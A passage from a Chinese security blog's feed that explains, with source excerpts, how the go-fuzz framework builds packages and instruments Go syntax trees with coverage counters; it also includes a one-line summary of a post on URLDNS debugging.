    <summary type="html">&lt;h1 id=&quot;URLDNS调试那些小事&quot;&gt;&lt;a href=&quot;#URLDNS调试那些小事&quot; class=&quot;headerlink&quot; title=&quot;URLDNS调试那些小事&quot;&gt;&lt;/a&gt;URLDNS调试那些小事&lt;/h1&gt;&lt;p&gt;近期在看javaweb相关的知识，ysoserial作为反序</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://rainsec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>云原生项目Fuzz特点及思考</title>
    <link href="https://rainsec.cn/post/Go-Fuzz%E8%A7%A3%E6%9E%90%E4%B8%8E%E6%80%9D%E8%80%83.html"/>
    <id>https://rainsec.cn/post/Go-Fuzz%E8%A7%A3%E6%9E%90%E4%B8%8E%E6%80%9D%E8%80%83.html</id>
    <published>2022-03-25T10:48:45.000Z</published>
    <updated>2023-04-12T02:36:51.327Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Go-fuzz的解析与思考"><a href="#Go-fuzz的解析与思考" class="headerlink" title="Go-fuzz的解析与思考"></a>Go-fuzz的解析与思考</h1><h2 id="go-fuzz"><a href="#go-fuzz" class="headerlink" title="go-fuzz"></a>go-fuzz</h2><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>Go-fuzz的原理很多都是基于AFL，这里只分析了一些它独特的地方，收获很多，也希望可以和大家交流，如有分析错误还望交流指正。</p></blockquote><p>​        go-fuzz是google开源的一款go语言fuzz框架，它和AFL很大的一个不同是在于，AFL通常通过对未修改的文件的输入进行操作，而go-fuzz需要你编写一个Fuzz函数，go-fuzz通过不断的调用该函数来进行fuzz，前者通常会为每一个输入创建一个新的进程，后者则是不断的调用Fuzz函数因此不需要经常启动或者重启进程。</p><h2 id="什么是覆盖引导型Fuzz"><a href="#什么是覆盖引导型Fuzz" class="headerlink" title="什么是覆盖引导型Fuzz"></a>什么是覆盖引导型Fuzz</h2><p>​        覆盖引导型Fuzz通过代码覆盖率信息来决定一个突变是否有效，如果代码覆盖率增长就保存该输入并对其进行持续变异，否则就丢弃该变异：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/gofuzz01.jpg" alt="img"></p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/gofuzz02.jpg" alt="img"></p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/gofuzz03.jpg" alt="img"></p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/gofuzz04.jpg" alt="img"></p><h2 id="源码解析"><a href="#源码解析" class="headerlink" title="源码解析"></a>源码解析</h2><h3 id="go-fuzz-build模块"><a href="#go-fuzz-build模块" class="headerlink" title="go-fuzz-build模块"></a>go-fuzz-build模块</h3><p>​        该模块的主要作用在于将需要测试的包信息和测试用例信息打包方便进行测试。</p><ol><li>利用PProf进行性能分析</li><li>加载选中的go语言包和github.com/dvyukov/go-fuzz/go-fuzz-dep这个fuzz材料包</li><li>遍历加载的go语言包里面所有的函数名查找所有的名为Fuzz的函数，同时进行签名认证，但是Fuzz函数的个数应该大于0同时小于等于255</li><li>获取环境变量，大多是和go有关的环境变量.</li><li>加载go语言标准库</li><li>忽略一些标准库中的包和github.com/dvyukov/go-fuzz/go-fuzz-dep这个包，因为没有理由进行fuzz测试，为了避免陷入循环（具体为啥我也不是很清楚）</li><li>在/tmp下创建临时文件夹保存需要使用的tools和包</li><li>接下来就是很高阶的语法树等的建立过程，这个过程中会使用gatherLiterals获取到你提供的初始材料<ol><li>获取到需要fuzz的包的具体信息，进而可以生成go-fuzz的元数据</li><li>将存储信息的cover.exe和sonar.exe已经metadata打包生成zip文件夹</li></ol></li></ol><h3 id="语法树插桩实现"><a href="#语法树插桩实现" class="headerlink" title="语法树插桩实现"></a>语法树插桩实现</h3><p>​        go语言不同于C语言可以as等汇编工具来较为方便的实现编译时插桩（具体可以参考AFL的插桩方式），为了实现go语言的编译时插桩，我们首先要了解go语言整体的编译流程：</p><ol><li>词法与语法分析</li><li>类型检查</li><li>中间代码生成</li><li>机器码生成</li></ol><p>那么其实大致就可以看出比较理想的地方就是词法与语法分析的时候对抽象语法书进行插桩了，同时go标准库也提供了scanner，ast和token等相关库来帮助很好的扫描，解析和创建相关抽象语法树，在整个插桩的过程中其实是把go的包一个个遍历插桩的，然后因为go-fuzz不允许导入main包，其实是因为它在插桩完成之后会自己加入相关的main函数。</p><p>​        在go-fuzz-build中实现了结构体File和结构体Sonar，这两个结构体都实现了自己的Visit()函数用来遍历相关的语法树：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">type</span> File <span class="token keyword">struct</span> <span class="token punctuation">{</span>fset     <span class="token operator">*</span>token<span class="token punctuation">.</span>FileSetpkg      <span class="token builtin">string</span>fullName <span class="token builtin">string</span>astFile  <span class="token operator">*</span>ast<span class="token punctuation">.</span>Fileblocks   <span class="token operator">*</span><span class="token punctuation">[</span><span class="token punctuation">]</span>CoverBlockinfo     <span class="token operator">*</span>types<span class="token punctuation">.</span>Info<span class="token punctuation">}</span><span class="token keyword">type</span> Sonar <span class="token keyword">struct</span> <span class="token punctuation">{</span>fset     <span class="token operator">*</span>token<span class="token punctuation">.</span>FileSetfullName <span class="token builtin">string</span>pkg      <span class="token builtin">string</span>blocks   <span class="token operator">*</span><span class="token punctuation">[</span><span class="token punctuation">]</span>CoverBlockinfo     <span class="token operator">*</span>types<span class="token punctuation">.</span>Info<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在整个的build的过程中也会生成coverBin和sonarBin两个文件分别对应上述两个结构体的语法树遍历函数执行结果。</p><h4 id="File遍历"><a href="#File遍历" class="headerlink" title="File遍历"></a>File遍历</h4><p>​        在生成coverBin的时候使用的是File结构体对应的Visit遍历函数，不过在开始遍历之前会通过自身实现的addImport来实现go-fuzz-dep包相关内容的导入：</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>file.addImport(“go-fuzz-dep”, fuzzdepPkg, “CoverTab”)</p></blockquote><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>f <span class="token operator">*</span>File<span class="token punctuation">)</span> <span class="token function">addImport</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> name<span class="token punctuation">,</span> anyIdent <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>newImport <span class="token operator">:=</span> <span class="token operator">&amp;</span>ast<span class="token punctuation">.</span>ImportSpec<span class="token punctuation">{</span>Name<span class="token punctuation">:</span> ast<span class="token punctuation">.</span><span class="token function">NewIdent</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">,</span>Path<span class="token punctuation">:</span> <span class="token operator">&amp;</span>ast<span class="token punctuation">.</span>BasicLit<span class="token punctuation">{</span>Kind<span class="token punctuation">:</span>  token<span class="token punctuation">.</span>STRING<span class="token punctuation">,</span>Value<span class="token punctuation">:</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"%q"</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span>impDecl <span class="token operator">:=</span> <span class="token operator">&amp;</span>ast<span class="token punctuation">.</span>GenDecl<span class="token punctuation">{</span>Lparen<span class="token punctuation">:</span> f<span class="token punctuation">.</span>astFile<span class="token punctuation">.</span>Name<span class="token punctuation">.</span><span class="token function">End</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>Tok<span class="token punctuation">:</span>    token<span class="token punctuation">.</span>IMPORT<span class="token punctuation">,</span>Specs<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>ast<span class="token punctuation">.</span>Spec<span class="token punctuation">{</span>newImport<span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">,</span>Rparen<span class="token punctuation">:</span> f<span class="token punctuation">.</span>astFile<span class="token punctuation">.</span>Name<span class="token punctuation">.</span><span class="token function">End</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token comment">// Make the new import the first Decl in the file.</span>astFile <span class="token operator">:=</span> f<span class="token punctuation">.</span>astFileastFile<span class="token punctuation">.</span>Decls <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>astFile<span class="token punctuation">.</span>Decls<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token function">copy</span><span class="token punctuation">(</span>astFile<span class="token punctuation">.</span>Decls<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> astFile<span class="token punctuation">.</span>Decls<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>astFile<span class="token punctuation">.</span>Decls<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> impDeclastFile<span class="token punctuation">.</span>Imports <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>astFile<span class="token punctuation">.</span>Imports<span class="token punctuation">,</span> newImport<span class="token punctuation">)</span><span class="token comment">// Now refer to the package, just in case it ends up unused.</span><span class="token comment">// That is, append to the end of the file the declaration</span><span class="token comment">//var _ = _cover_atomic_.AddUint32</span>reference <span class="token operator">:=</span> <span class="token operator">&amp;</span>ast<span class="token punctuation">.</span>GenDecl<span class="token punctuation">{</span>Tok<span class="token punctuation">:</span> token<span class="token punctuation">.</span>VAR<span class="token punctuation">,</span>Specs<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>ast<span class="token punctuation">.</span>Spec<span class="token punctuation">{</span><span class="token operator">&amp;</span>ast<span class="token punctuation">.</span>ValueSpec<span class="token punctuation">{</span>Names<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">*</span>ast<span class="token punctuation">.</span>Ident<span class="token punctuation">{</span>ast<span class="token punctuation">.</span><span class="token function">NewIdent</span><span class="token punctuation">(</span><span class="token string">"_"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">,</span>Values<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>ast<span class="token punctuation">.</span>Expr<span class="token punctuation">{</span><span class="token operator">&amp;</span>ast<span class="token punctuation">.</span>SelectorExpr<span class="token punctuation">{</span>X<span class="token punctuation">:</span>   ast<span class="token punctuation">.</span><span class="token function">NewIdent</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">,</span>Sel<span class="token punctuation">:</span> ast<span class="token punctuation">.</span><span class="token function">NewIdent</span><span class="token punctuation">(</span>anyIdent<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span>astFile<span class="token punctuation">.</span>Decls <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>astFile<span class="token punctuation">.</span>Decls<span class="token punctuation">,</span> reference<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>观察源码其实逻辑也很简单，首先创建了一个基本声明信息节点来将相关的包导入原本的语法树中，同时为了避免导入包但是未使用，所以导入简单的声明语句。导入完成之后使用ast.Walk()来遍历语法树，该函数会调用File结构体对应的Visit函数。</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// 源码太长，只贴部分</span><span class="token keyword">func</span> <span class="token punctuation">(</span>f <span class="token operator">*</span>File<span class="token punctuation">)</span> <span class="token function">Visit</span><span class="token punctuation">(</span>node ast<span class="token punctuation">.</span>Node<span class="token punctuation">)</span> ast<span class="token punctuation">.</span>Visitor <span class="token punctuation">{</span><span class="token keyword">switch</span> n <span class="token operator">:=</span> node<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token keyword">type</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">case</span> <span class="token operator">*</span>ast<span class="token punctuation">.</span>FuncDecl<span class="token punctuation">:</span><span class="token keyword">if</span> n<span class="token punctuation">.</span>Name<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"init"</span> <span class="token punctuation">{</span><span class="token comment">// Don't instrument init functions.</span><span class="token comment">// They run regardless of what we do, so it is just noise.</span><span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">}</span><span class="token keyword">case</span> <span class="token operator">*</span>ast<span class="token punctuation">.</span>GenDecl<span class="token punctuation">:</span><span class="token keyword">if</span> n<span class="token punctuation">.</span>Tok <span class="token operator">!=</span> token<span class="token punctuation">.</span>VAR <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token boolean">nil</span> <span class="token comment">// constants and types are not interesting</span><span class="token punctuation">}</span><span class="token keyword">case</span> <span class="token operator">*</span>ast<span class="token punctuation">.</span>BlockStmt<span class="token punctuation">:</span> <span class="token comment">// {}中间的语句</span><span class="token comment">// If it's a switch or select, the body is a list of case clauses; don't tag the block itself.</span><span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>n<span class="token punctuation">.</span>List<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token punctuation">{</span><span class="token keyword">switch</span> n<span class="token punctuation">.</span>List<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token keyword">type</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">case</span> <span class="token operator">*</span>ast<span class="token punctuation">.</span>CaseClause<span class="token punctuation">:</span> <span class="token comment">// switch</span><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> n <span class="token operator">:=</span> <span class="token keyword">range</span> n<span class="token punctuation">.</span>List <span class="token punctuation">{</span>clause <span class="token operator">:=</span> n<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token operator">*</span>ast<span class="token punctuation">.</span>CaseClause<span class="token punctuation">)</span>clause<span class="token punctuation">.</span>Body <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token function">addCounters</span><span class="token punctuation">(</span>clause<span class="token punctuation">.</span><span class="token function">Pos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> clause<span class="token punctuation">.</span><span class="token function">End</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> clause<span class="token punctuation">.</span>Body<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">return</span> f<span class="token keyword">case</span> <span class="token operator">*</span>ast<span class="token punctuation">.</span>CommClause<span class="token punctuation">:</span> <span class="token comment">// select</span><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> n <span class="token operator">:=</span> <span class="token keyword">range</span> n<span class="token punctuation">.</span>List <span class="token punctuation">{</span>clause <span class="token operator">:=</span> n<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token operator">*</span>ast<span class="token punctuation">.</span>CommClause<span class="token punctuation">)</span>clause<span class="token punctuation">.</span>Body <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token function">addCounters</span><span class="token punctuation">(</span>clause<span class="token punctuation">.</span><span class="token function">Pos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> clause<span class="token punctuation">.</span><span class="token function">End</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> clause<span class="token punctuation">.</span>Body<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">return</span> f<span class="token punctuation">}</span><span class="token punctuation">}</span>n<span class="token punctuation">.</span>List <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token function">addCounters</span><span class="token punctuation">(</span>n<span class="token punctuation">.</span>Lbrace<span class="token punctuation">,</span> n<span class="token punctuation">.</span>Rbrace<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">.</span>List<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token comment">// +1 to step past closing brace.</span><span class="token operator">...</span><span class="token operator">...</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出在遍历语法树的过程中对节点的类型进行了判断，然后对{}中间的内容进行一个判断和插桩，具体的插桩函数如下：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>f <span class="token operator">*</span>File<span class="token punctuation">)</span> <span class="token function">addCounters</span><span class="token punctuation">(</span>pos<span class="token punctuation">,</span> blockEnd token<span class="token punctuation">.</span>Pos<span class="token punctuation">,</span> list <span class="token punctuation">[</span><span class="token punctuation">]</span>ast<span class="token punctuation">.</span>Stmt<span class="token punctuation">,</span> extendToClosingBrace <span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>ast<span class="token punctuation">.</span>Stmt <span class="token punctuation">{</span><span class="token comment">// Special case: make sure we add a counter to an empty block. Can't do this below</span><span class="token comment">// or we will add a counter to an empty statement list after, say, a return statement.</span><span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>ast<span class="token punctuation">.</span>Stmt<span class="token punctuation">{</span>f<span class="token punctuation">.</span><span class="token function">newCounter</span><span class="token punctuation">(</span>pos<span class="token punctuation">,</span> blockEnd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// We have a block (statement list), but it may have several basic blocks due to the</span><span class="token comment">// appearance of statements that affect the flow of control.</span><span class="token keyword">var</span> newList <span class="token punctuation">[</span><span class="token punctuation">]</span>ast<span class="token punctuation">.</span>Stmt<span class="token keyword">for</span> <span class="token punctuation">{</span><span class="token comment">// Find first statement that affects flow of control (break, continue, if, etc.).</span><span class="token comment">// It will be the last statement of this basic block.</span><span class="token keyword">var</span> last <span class="token builtin">int</span>end <span class="token operator">:=</span> blockEnd<span class="token keyword">for</span> last <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> last <span class="token operator">&lt;</span> <span class="token function">len</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span> last<span class="token operator">++</span> <span class="token punctuation">{</span>end <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token function">statementBoundary</span><span class="token punctuation">(</span>list<span class="token punctuation">[</span>last<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> f<span class="token punctuation">.</span><span class="token function">endsBasicSourceBlock</span><span class="token punctuation">(</span>list<span class="token punctuation">[</span>last<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>extendToClosingBrace <span class="token operator">=</span> <span class="token boolean">false</span> <span class="token comment">// Block is broken up now.</span>last<span class="token operator">++</span><span class="token keyword">break</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span> extendToClosingBrace <span class="token punctuation">{</span>end <span class="token operator">=</span> blockEnd<span class="token punctuation">}</span><span class="token keyword">if</span> pos <span class="token operator">!=</span> end <span class="token punctuation">{</span> <span class="token comment">// Can have no source to cover if e.g. blocks abut.</span>newList <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>newList<span class="token punctuation">,</span> f<span class="token punctuation">.</span><span class="token function">newCounter</span><span class="token punctuation">(</span>pos<span class="token punctuation">,</span> end<span class="token punctuation">,</span> last<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 在List里面增加counter计数器</span><span class="token punctuation">}</span>newList <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>newList<span class="token punctuation">,</span> list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>last<span class="token punctuation">]</span><span class="token operator">...</span><span class="token punctuation">)</span>list <span class="token operator">=</span> list<span class="token punctuation">[</span>last<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{</span><span class="token keyword">break</span><span class="token punctuation">}</span>pos <span class="token operator">=</span> list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">Pos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">return</span> newList<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>假设现在有一个switch的demo</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">var</span> n <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">switch</span> n <span class="token punctuation">{</span><span class="token keyword">case</span> <span class="token number">0</span><span class="token punctuation">:</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"this is 0"</span><span class="token punctuation">)</span><span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"this is 1"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一步的具体操作就是把每一个case拿出来，然后将case相关的语法树的起始位置和结束位置还有body部分全部传入addCounters，addCounters的逻辑起始也非常简单，如果body为空就直接返回一个Counter的ast.Stmt声明语法树结构，</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p> Counter是作者自定义的一种插桩计数器，这种计数器主要包括两个部分:</p><ol><li>对于每个包的File的结构体都维护了一个*[]CoverBlock，每次增加Counter都会在这个数组里面增加一个CoverBlock里面记录了插桩语法树的位置以及内部是否还包含多少其他声明。</li><li>一个是ast.IncDecStmt节点，这个是newCounter()函数的返回值</li></ol></blockquote><p>如果body不为空就找到所有影响控制流的声明，比如if，switch, break ,goto等都会开启或者中断一个新的控制流，找到边界声明之后判断其是否属于刚才的类型：</p><pre class="line-numbers language-go" data-language="go"><code 